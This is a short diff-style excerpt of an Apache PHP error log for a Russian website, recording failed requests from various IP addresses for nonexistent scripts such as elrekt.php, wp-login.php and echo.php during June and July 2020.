+[Tue Jun 30 00:08:53.531152 2020] [php7:error] [pid 3273] [client 157.230.242.248:40892] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 30 01:59:44.445896 2020] [php7:error] [pid 31708] [client 93.174.93.45:50308] script '/var/www/banks.obzorzarplat.ru/docs/public/setup.php' not found or unable to stat
+[Tue Jun 30 02:42:43.547084 2020] [php7:error] [pid 3274] [client 58.144.208.115:60862] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 30 04:41:20.742889 2020] [php7:error] [pid 21094] [client 122.51.130.91:50454] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 30 16:50:18.300074 2020] [php7:error] [pid 11342] [client 127.0.0.1:53880] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Jun 30 17:39:20.333207 2020] [php7:error] [pid 11688] [client 127.0.0.1:54370] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Wed Jul 01 19:32:23.671335 2020] [php7:error] [pid 21741] [client 182.61.169.191:53768] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jul 02 05:28:26.660704 2020] [php7:error] [pid 5998] [client 5.188.210.101:44270] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Thu Jul 02 08:20:20.571776 2020] [php7:error] [pid 4049] [client 193.112.100.168:58742] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Jul 03 07:47:36.341240 2020] [php7:error] [pid 4454] [client 58.144.208.115:58218] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Jul 05 04:16:03.904621 2020] [php7:error] [pid 1140] [client 127.0.0.1:53390] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Sun Jul 05 20:10:20.584352 2020] [php7:error] [pid 27859] [client 81.68.110.250:55770] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jul 08 04:11:34.303095 2020] [php7:error] [pid 11491] [client 176.120.28.179:33812] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Jul 09 12:51:54.299015 2020] [php7:error] [pid 31260] [client 5.188.210.101:13457] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
